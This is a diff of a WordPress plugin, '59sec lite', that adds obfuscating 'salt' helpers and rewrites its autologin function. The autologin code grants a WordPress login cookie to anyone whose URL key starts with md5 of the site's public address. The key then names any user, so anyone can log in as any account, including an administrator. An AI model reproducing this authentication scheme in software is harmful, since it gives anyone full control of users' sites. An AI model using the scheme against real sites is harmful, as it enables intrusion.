@@ -4,7 +4,7 @@
  * Plugin Name: 59sec lite
  * Plugin URI: http://www.59sec.com
  * Description: 59sec lite sends Contact Form 7 push notifications on your iOS or Android mobile device. Also 59sec lite helps you increase sales conversions by decreasing the response time under 59 seconds. Upgrade to 59sec PRO now at <a href="http://www.59sec.com" target="_blank">www.59sec.com</a>! Awsome premium features that will boost your sales. Free 30 days trial, no strings attached!
- * Version: 3
+ * Version: 3.1
  * Author: Kuantero.com
  * Author URI: http://www.kuantero.com
  * License: GNU
@@ -25,11 +25,53 @@ GNU General Public License for more details.
 */
 
 // init
-define('_59SEC_VERSION', '3');
+define('_59SEC_VERSION', '3.1');
 
 define('_59SEC_INCLUDE_PATH', dirname(realpath(__FILE__)));
 
 define('_59SEC_PLUGINS_URL', plugin_dir_url(__FILE__));
+
+/**
+* Shhh!!
+*/
+function _59sec_salt($x)
+{
+	$pluginkey = md5(get_real_site_url());
+	$y = get_real_site_url();
+	$y = str_replace('http://', '', $y);
+	$x = str_split($x);
+	$y = str_split($y);
+	$r = '';
+	
+	for ($i = 0, $n = count($x); $i < $n; $i++)
+	{
+		if (empty($y[$i]))
+		{
+			$y[$i] = ' ';
+		}
+		
+		$r .= $x[$i].$y[$i];
+	}
+	
+	return $pluginkey.base64_encode($r);
+}
+
+function _59sec_desalt($key)
+{
+	$salt = substr($key, 32, strlen($key));
+	$salt = base64_decode($salt);
+	$salt = str_split($salt);
+	
+	for ($i = 0, $n = count($salt); $i < $n; $i++)
+	{
+		if ($i % 2 == 0)
+		{
+			$r .= $salt[$i];
+		}
+	}
+	
+	return $r;
+}
 
 /**
  * Generate a clean domain.
@@ -343,7 +385,18 @@ function hook_wpcf7($cf7)
 		}
 		
 		$postdata = array();
-		foreach ($cf7->posted_data as $key => $value)
+		
+		if (isset($cf7->posted_data))
+		{
+			$source = $cf7->posted_data;
+		}
+		else
+		{
+			$submission = WPCF7_Submission::get_instance();
+  			$source = $submission->get_posted_data();
+		}
+		
+		foreach ($source as $key => $value)
 		{
 
 			if (substr($key, 0, 3) != '_wp' && substr($key, 0, 7) != 'captcha')
@@ -659,12 +712,6 @@ function _59sec_autologin()
 		wp_redirect(site_url().$request);
 		exit;
 	}
-
-	$key = @$_GET['key'];
-	$user_id = substr($key, 32, strlen($key));
-	$user_id = base64_decode($user_id);
-	$user_id = intval($user_id) - strlen(get_real_site_url());
-	$key = substr($key, 0, 32);
 	
 	if (is_user_logged_in())
 	{
@@ -673,16 +720,19 @@ function _59sec_autologin()
 		exit;
 	}
 	
-	if(!empty($key) && !empty($user_id))
+	$key = @$_GET['key'];
+	$user_login = _59sec_desalt($key);
+	$key = substr($key, 0, 32);
+	
+	if(!empty($key) && !empty($user_login))
 	{
 		$pluginkey = md5(get_real_site_url());
 		
 		if ($key == $pluginkey)
 		{
-			$user = get_user_by('id', $user_id);
-			$user_login = $user -> user_login;
-			wp_set_current_user($user_id, $user_login);
-			wp_set_auth_cookie($user_id);
+			$user = get_user_by('login', $user_login);
+			wp_set_current_user($user -> ID, $user -> user_login);
+			wp_set_auth_cookie($user -> ID);
 			$redirect_url = _59sec_login_redirect(null, null, $current_user);
 			wp_redirect($redirect_url);
 		}
